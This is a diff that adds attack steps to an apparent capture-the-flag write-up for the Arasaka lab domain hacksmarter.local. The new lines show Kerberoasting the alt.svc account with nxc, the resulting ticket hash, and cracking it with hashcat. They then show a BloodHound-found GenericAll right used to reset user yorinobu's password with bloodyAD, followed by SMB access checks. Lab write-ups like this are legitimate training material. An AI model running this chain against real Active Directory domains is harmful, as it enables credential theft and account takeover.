@@ -121,13 +121,78 @@ SMB         10.1.173.11     445    DC01             SYSVOL          READ        
 bloodhound-python -d 'hacksmarter.local' -u 'faraday' -p 'hacksmarter123' -dc 'dc01.hacksmarter.local' -c all -ns  10.1.173.11
 ----
 
+Enumerated that exist user `alt.svc` and it is `kerberoastable` so we can catch hash and crack it
+
+[sourse]
+----
+kali ~/hack_smarter/machines/Arasaka $ nxc ldap dc01.hacksmarter.local -u 'faraday' -p 'hacksmarter123' --kerberoasting output.txt
+LDAP        10.1.173.11     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local)
+LDAP        10.1.173.11     389    DC01             [+] hacksmarter.local\faraday:hacksmarter123 
+LDAP        10.1.173.11     389    DC01             [*] Skipping disabled account: krbtgt
+LDAP        10.1.173.11     389    DC01             [*] Total of records returned 1
+LDAP        10.1.173.11     389    DC01             [*] sAMAccountName: alt.svc, memberOf: [], pwdLastSet: 2025-09-21 18:07:42.894050, lastLogon: <never>
+LDAP        10.1.173.11     389    DC01             $krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local\alt.svc*$eae4025e2df59ff4a3c335af996576ee$8448240e1b7e6313c8247e357b26e202f8ff2f5a7ccdd798f5a422877cc4c4c4d504de67fdd8ca689a440779bef3dc5e5a1a4c352409511e085aeda587f5f64ae5eeeb6c5b7df2fca90edb771dd16e393bf986a80ab48fc6d0711e3f3083d19fbaad560abcae7657d4532a778bca47e0374ef76380b484412e75cdf07056c05553a3dc3dce9c2a59019260a4d23a8c3be67114eb6e69b6da66c16cec6fe9dbefb7ab8c51fa1a336d9378bd38b27fa038125988708f532be26731188446afc3229c125068614bd3bca3ae680c213d638b1e810c8a2df18b81748a577d72e469bfab692b5825c8b797196dcfa4e3c9fc1a83c52e0cf798e78a4c1741a5a96ea7c5abe1eb73cab09602d983c10ad161ff2aa39030446f9c90275fe22403818cf716d65dfda4d759b16049f3a96fbca0ef3b693a7fa9f3a4d5382fa39a3a6b9cb3abb0383d04e7e204fea7cca6dd6f4f438851c1ba67e7efc3c3105f80b79c808cfda4be1d5a06c9eb6f6cca27f665bccaf5fa077495606f8469ea021ea44ebdca361a0958ddd0994e5b2f9a63fe300b94a5e7538df2173a0dd119ac9b0389e119c23893c23a17dacef7e11bbc3f919336e0d0fa76bede1b04d0193406dca5b0634b35b17f64bd9b847fa856d0b7736dff68728f3d90263c6faddaa7eb4a2de73200cedc61854c16ccb242d19581dcef98b0f966a80a5ff4d85d8931ac16ddf062e1531d8e6b8b3ac6c50a66760bead04bd07006c84441631b4e9076737af07110a76f0d8f879599d936cc0ca4da5c5043c90c1129fa86593b8167c7454ae933f5cfadf01c172e6b3555b979058ef08a02961b34b390ab6c5bd5f94c4e8997efe1d13219ffb4f0cd1151b1eee7f45afb5c40ef1b3480309386086194bd6c1febfa09fe5cb2089d868c18fc963520c4277c1cd50f31ff04f4642aaf1af230911795254caf56a9a4cef55a82f4bf660beba46f4a3f68cdcb626c525adb00683985e2cb20231dcfacede1fce26306f35cebf358f8310a735928a7c044e163977b95866ebe9ef2de30b2e609bcad705924c08a387b825f32e7b815b567c7473be745fedd7dd6bac59e16421664d0a56683743fbcbf882595f893243304e1c2133acadfdabc02e7757677b128964b85dda08e197966b039a1c5a369ff777cbe31de992f43c97a40b30ac7211fa6336a6c3cca1e5173e090ad5ee4a6be08760d9512097f58cbeb0ddfae2443dd0b77f9733e32699b2caefb32bbce3cccca32a5d0c8bef8b80869d3f305a021a66987f17ce229942b4cec56879887556d1800c2e2c99c740cc1e91ec9b459ff1186b76f9aea84bfdce7549324682f475ac3b0809d220e32b077e39ce76e5066868affeaafa533efca2f8b9ddc7f16d561c07f5f33e41ec823424a618ad95021cd42156cb34670bf873a15ce14d4ca1b6a104202e0e4f8ad5c896c77ca23abb840925a8bd0f1191cb89290191ee6b265577062a6828abc45d5e1bbcf95a027a133223b086146131c24315ec37d6916ac252c  
+----
+
+Crack
+
+[sourse]
+----
+hashcat hash.alt_svc  /home/kali/wordlists/passwords/rockyou.txt
+----
+
+
+Check if user is valid
+
+[sourse]
+----
+nxc smb 10.1.173.11 -u 'alt.svc' -p 'babygirl1' --shares
+----
+
+Enumerated a new user `alt.svc` : `babygirl1`
+
+
 [[ad-enum]]
 == AD Enumeration
+
+In Bloodhound looks like user `alt.svc` have `GenereticAll` privileges to user `YORINOBU`
+
+So change password of user `yorinobu` is possible
+
+[sourse]
+----
+bloodyAD --host "10.1.173.11" -d 'dc01.hacksmarter.local' -u  'alt.svc' -p  'babygirl1' set password 'yorinobu' 'fuckpass'
+[+] Password changed successfully!
+----
+
+Check
+
+[sourse]
+----
+nxc smb 10.1.173.11 -u 'yorinobu' -p 'fuckpass' --shares 
+SMB         10.1.173.11     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)
+SMB         10.1.173.11     445    DC01             [+] hacksmarter.local\yorinobu:fuckpass 
+SMB         10.1.173.11     445    DC01             [*] Enumerated shares
+SMB         10.1.173.11     445    DC01             Share           Permissions     Remark
+SMB         10.1.173.11     445    DC01             -----           -----------     ------
+SMB         10.1.173.11     445    DC01             ADMIN$                          Remote Admin
+SMB         10.1.173.11     445    DC01             C$                              Default share
+SMB         10.1.173.11     445    DC01             IPC$            READ            Remote IPC
+SMB         10.1.173.11     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.1.173.11     445    DC01             SYSVOL          READ            Logon server share 
+----
+
+New obtained user is `yorinobu` : 'fuckpass`
+
+
+
+
 
 
 
 [[ad-access]]
 == AD Enumeration & Access
+
 
 
 
